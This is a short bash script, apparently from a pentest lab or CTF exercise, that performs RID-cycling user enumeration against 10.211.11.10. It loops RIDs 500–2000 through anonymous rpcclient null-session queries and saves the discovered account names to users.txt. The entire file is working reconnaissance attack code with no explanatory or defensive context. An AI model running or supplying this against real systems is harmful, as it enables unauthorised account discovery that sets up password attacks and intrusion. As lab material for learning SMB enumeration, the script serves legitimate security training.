#!/bin/bash

for i in $(seq 500 2000); do
    user=$(echo "queryuser $i" | rpcclient -U "" -N 10.211.11.10 2>/dev/null | grep -i "User Name")
    if [ -n "$user" ]; then
	    modUser=$(echo "$user" | awk -F':' '/User Name/ {gsub(/^[ \t]+/, "", $2); print $2}')
        echo "$modUser" >> users.txt
    fi
done

